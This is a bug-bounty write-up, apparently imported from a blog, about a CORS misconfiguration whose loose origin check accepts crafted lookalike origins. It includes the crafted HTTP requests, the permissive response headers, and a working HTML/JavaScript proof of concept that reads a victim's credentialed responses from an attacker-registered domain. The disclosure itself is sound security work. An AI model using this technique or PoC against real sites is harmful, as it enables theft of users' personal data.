---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-23_cors-misconfiguration-leading-to-private-information-disclosure.md
original_filename: 2020-01-23_cors-misconfiguration-leading-to-private-information-disclosure.md
title: CORS Misconfiguration leading to Private Information Disclosure
category: documents
detected_topics:
- cors
- command-injection
- information-disclosure
tags:
- imported
- documents
- cors
- command-injection
- information-disclosure
language: en
raw_sha256: 5006caab3e7b07496dc948d05efa52a71035dcf918389b627a0fa1460fb51f67
text_sha256: f8501d25a2537aa42ef7b94ea70329b202a8daf4e4a27912fdbe2a7e6fd4c598
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# CORS Misconfiguration leading to Private Information Disclosure

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-23_cors-misconfiguration-leading-to-private-information-disclosure.md
- Source Type: markdown
- Detected Topics: cors, command-injection, information-disclosure
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `5006caab3e7b07496dc948d05efa52a71035dcf918389b627a0fa1460fb51f67`
- Text SHA256: `f8501d25a2537aa42ef7b94ea70329b202a8daf4e4a27912fdbe2a7e6fd4c598`


## Content

---
title: "CORS Misconfiguration leading to Private Information Disclosure"
url: "https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93"
authors: ["Virus0X01 (@Virus0X01)"]
bugs: ["CORS misconfiguration"]
publication_date: "2020-01-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4816
scraped_via: "browseros"
---

# CORS Misconfiguration leading to Private Information Disclosure

Virus0X01
Follow
2 min read
·
Jan 24, 2020

223

2

CORS Misconfiguration leading to Private Information Disclosure

Hi hackers, today i will talk about CORS that i found in a private program

let’s call it private.com

After doing some recon , i found this domain let’s say xyz.private.com

i sent a request to burp to start doing some crawling and parameter digging and so on , request was sent to the server with Origin header

GET / HTTP/1.1 
Host: xyz.private.com 
Origin: https://xyz.private.com 
Connection: close

the origin header was accepted by Access-Control-Allow-Origin header and the Access-Control-Allow-Credentials was set to true

Access-Control-Allow-Credentials: true 
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://xyz.private.com 
Access-Control-Expose-Headers: 

here i started to do some investigation to see how the server handles the origin header

so i sent a request with the main domain only to server and the server accepted it

Access-Control-Allow-Credentials: true 
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://private.com 
Access-Control-Expose-Headers: 

i deleted the dot from private.com and it was accepted too , the server checks if the domain name and com exists neglecting any thing between them .

Get Virus0X01’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

i sent a request with 1 between private and com like this

GET / HTTP/1.1 
Host: xyz.private.com 
Origin: https://private1com 
Connection: close

and it got accepted :)

Access-Control-Allow-Credentials: true 
Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://private1com 
Access-Control-Expose-Headers: 

i signed a domain on https://ae.000webhost.com with the name https://privatescom.000webhostapp.com , i put “s” instead of 1 because it wasn’t allowed in the subdomain name.

with small piece of code i could make the POC

<!DOCTYPE html> 
<html> 
<body> 
<center> 
<h2>CORS POC Exploit</h2>
<div id="demo"> 
<button type="button" onclick="cors()">Exploit</button>
 </div>  
<script> function cors() { 
  var xhttp = new XMLHttpRequest(); 
  xhttp.onreadystatechange = function()
  {  
  if (this.readyState == 4 && this.status == 200) { 
  document.getElementById("demo").innerHTML =  alert(this.responseText);
  }  
  };  
  xhttp.open("GET", "https://xyz.private.com", true);  
  xhttp.withCredentials = true;  
  xhttp.send(); 
}
</script> 
</body> 
</html>

and we got the response on our domain , and i could steal any user’s personal information.

Press enter or click to view image in full size
simple POC

i’d like to thank my friend 
offensive hunterr
 , he gave me the idea of signing the domain and helped me with the JS code ❤
